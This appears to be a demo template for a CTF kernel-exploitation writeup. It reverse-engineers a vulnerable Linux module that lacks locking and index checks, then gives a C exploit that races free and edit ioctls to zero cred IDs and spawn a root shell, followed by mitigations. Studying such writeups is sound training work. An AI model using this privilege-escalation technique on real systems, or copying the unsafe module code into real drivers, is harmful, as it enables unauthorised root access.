---
title: "Demo Kernel Challenge"
date: 2024-01-20T15:45:00Z
category: "ctf"
tags: ["demo", "template", "kernel-exploitation"]
challenge_category: "pwn"
challenge_points: 500
challenge_solves: 8
summary: "Demo template for kernel exploitation writeups - demonstrates proper formatting and structure."
ctf_name: "Demo CTF"
---

# Demo Kernel Challenge - Demo CTF

**Category**: pwn
**Points**: 500
**Solves**: 8

*This is a demo template showing the proper structure for kernel CTF writeups.*

## Challenge Description

```
[Challenge description from CTF organizers]

ssh ctf@challenge.example.com
Password: provided_password
```

**Files**: `module.ko`, `bzImage`, `initramfs.cpio.gz`

## Environment Analysis

Initial reconnaissance:

```bash
$ uname -a
Linux hostname 5.15.0-custom #1 SMP PREEMPT x86_64 GNU/Linux

$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)

$ ls -la /dev/ | grep challenge
crw-rw-rw- 1 root root 240, 0 Jan 20 12:34 challenge_device
```

## Static Analysis

Reverse engineered kernel module code:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define DEVICE_NAME "challenge_device"
#define MAX_CHUNKS 16

struct challenge_chunk {
    void *data;
    size_t size;
    int in_use;
};

static struct challenge_chunk chunks[MAX_CHUNKS];

// IOCTL commands
#define CHALLENGE_ALLOCATE _IOW('C', 0, struct alloc_request)
#define CHALLENGE_FREE     _IOW('C', 1, int)
#define CHALLENGE_EDIT     _IOW('C', 2, struct edit_request)

struct alloc_request {
    int idx;
    size_t size;
};

struct edit_request {
    int idx;
    void __user *data;
    size_t size;
};

static long challenge_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case CHALLENGE_ALLOCATE:
            return challenge_allocate(arg);
        case CHALLENGE_FREE:
            return challenge_free(arg);
        case CHALLENGE_EDIT:
            return challenge_edit(arg);
        default:
            return -EINVAL;
    }
}

static long challenge_allocate(unsigned long arg) {
    struct alloc_request req;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
        return -EFAULT;

    // Allocation logic with potential vulnerability
    chunks[req.idx].data = kmalloc(req.size, GFP_KERNEL);
    chunks[req.idx].size = req.size;
    chunks[req.idx].in_use = 1;

    return 0;
}

static long challenge_free(unsigned long arg) {
    int idx = (int)arg;

    // Free logic - potential race condition or UAF
    kfree(chunks[idx].data);
    chunks[idx].in_use = 0;

    return 0;
}
```

## Vulnerability Analysis

Identified vulnerabilities:

1. **Race Condition**: The module doesn't use proper locking mechanisms
2. **Use-After-Free**: Freed memory can still be accessed
3. **Missing Validation**: Input validation is insufficient

These vulnerabilities can lead to:
- Kernel memory corruption
- Arbitrary read/write in kernel space
- Privilege escalation to root

## Exploitation Strategy

High-level plan:

1. **Trigger Race Condition**: Use threading to create race between operations
2. **Kernel Heap Spray**: Spray kernel heap with controlled data
3. **Privilege Escalation**: Overwrite critical kernel structures (e.g., `cred` structure)
4. **Get Root Shell**: Execute shell with elevated privileges

## Exploitation Implementation

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <string.h>

#define CHALLENGE_ALLOCATE _IOW('C', 0, struct alloc_request)
#define CHALLENGE_FREE     _IOW('C', 1, int)
#define CHALLENGE_EDIT     _IOW('C', 2, struct edit_request)

struct alloc_request {
    int idx;
    size_t size;
};

struct edit_request {
    int idx;
    void *data;
    size_t size;
};

int fd;
volatile int stop_threads = 0;

void *free_thread(void *arg) {
    int idx = *(int *)arg;

    while (!stop_threads) {
        ioctl(fd, CHALLENGE_FREE, idx);
        usleep(1);
    }

    return NULL;
}

void *edit_thread(void *arg) {
    int idx = *(int *)arg;

    // Privilege escalation payload
    // Overwrites uid/gid in cred structure
    unsigned char payload[0x100];
    memset(payload, 0, sizeof(payload));

    // cred structure offsets (adjust for kernel version)
    *(uint32_t *)(payload + 4)  = 0; // uid
    *(uint32_t *)(payload + 8)  = 0; // gid
    *(uint32_t *)(payload + 12) = 0; // suid
    *(uint32_t *)(payload + 16) = 0; // sgid
    *(uint32_t *)(payload + 20) = 0; // euid
    *(uint32_t *)(payload + 24) = 0; // egid

    struct edit_request req = {
        .idx = idx,
        .data = payload,
        .size = sizeof(payload)
    };

    while (!stop_threads) {
        ioctl(fd, CHALLENGE_EDIT, &req);
        usleep(1);
    }

    return NULL;
}

int main() {
    printf("[*] Opening device\n");
    fd = open("/dev/challenge_device", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[*] Allocating chunk for exploitation\n");
    struct alloc_request alloc_req = {
        .idx = 0,
        .size = 0x100  // Size of target structure
    };

    if (ioctl(fd, CHALLENGE_ALLOCATE, &alloc_req) < 0) {
        perror("allocate");
        return 1;
    }

    printf("[*] Starting race condition exploit\n");

    int idx = 0;
    pthread_t free_tid, edit_tid;

    // Start racing threads
    pthread_create(&free_tid, NULL, free_thread, &idx);
    pthread_create(&edit_tid, NULL, edit_thread, &idx);

    // Let the race run
    sleep(2);

    // Stop threads
    stop_threads = 1;
    pthread_join(free_tid, NULL);
    pthread_join(edit_tid, NULL);

    printf("[*] Checking privileges\n");

    // Check if we gained root
    if (getuid() == 0) {
        printf("[+] Root privileges gained!\n");
        system("/bin/sh");
    } else {
        printf("[-] Exploit failed, uid still %d\n", getuid());
    }

    close(fd);
    return 0;
}
```

Compilation:

```bash
gcc -o exploit exploit.c -lpthread -static
./exploit
```

## Key Insights

- Kernel exploitation requires understanding of kernel data structures
- Race conditions in kernel code are extremely dangerous
- Proper locking mechanisms are essential for security
- Kernel heap spraying increases exploit reliability
- Static compilation avoids dependency issues

## Mitigation

Recommended mitigations:
- Use proper locking mechanisms (mutexes, spinlocks) for all shared data
- Implement atomic operations where appropriate
- Enable kernel hardening features (KASLR, SMEP, SMAP, KPTI)
- Regular code review for race condition vulnerabilities
- Use static analysis tools to detect concurrency issues

---

**Flag**: `FLAG{demo_kernel_flag_format}`
